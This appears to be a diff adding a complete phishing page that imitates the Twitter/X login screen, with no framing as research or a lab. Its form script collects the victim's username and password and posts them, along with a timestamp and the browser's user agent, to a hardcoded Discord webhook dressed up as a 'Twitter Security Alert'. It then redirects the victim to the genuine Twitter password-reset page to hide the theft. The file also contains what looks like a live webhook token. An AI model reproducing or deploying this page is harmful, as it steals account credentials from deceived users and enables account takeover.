@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Twitter</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            color: #0f1419;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .logo {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .login-title {
+            font-size: 23px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #cfd9de;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .submit-btn {
+            background-color: #1d9bf0;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 12px 0;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #536471;
+            font-size: 13px;
+        }
+        a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+        
+        /* Mobile-specific styles */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            .login-title {
+                font-size: 20px;
+                margin: 15px 0;
+            }
+            input[type="text"],
+            input[type="password"] {
+                padding: 10px;
+                font-size: 15px;
+            }
+            .submit-btn {
+                padding: 10px 0;
+                font-size: 15px;
+            }
+            .options {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="40" height="40" fill="#1d9bf0">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </svg>
+        </div>
+        
+        <h1 class="login-title">Log in to Twitter</h1>
+        
+        <form onsubmit="return sendToDiscord(event)">
+            <input type="text" id="username" placeholder="Phone, email, or username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            
+            <div class="options">
+                <label>
+                    <input type="checkbox" checked> Remember me
+                </label>
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="submit-btn">Log in</button>
+        </form>
+        
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+    function sendToDiscord(event) {
+        event.preventDefault();
+        
+        // Get form values
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        // Discord webhook payload
+        const payload = {
+            content: `🔐 New Twitter Login Attempt\n📧 Email/Phone: ${username}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}\n🌐 User Agent: ${navigator.userAgent}\n-----------------------------------------`,
+            username: "Twitter Security Alert",
+            avatar_url: "https://images.icon-icons.com/4029/PNG/512/twitter_x_new_logo_square_x_icon_256075.png"
+        };
+        
+        // Send to Discord webhook
+        fetch('https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Failed to send to Discord');
+            }
+            // Redirect to Twitter password reset page
+            window.location.href = 'https://twitter.com/account/begin_password_reset';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = 'https://twitter.com/account/begin_password_reset';
+        });
+        
+        return false;
+    }
+    </script>
+</body>
+</html>
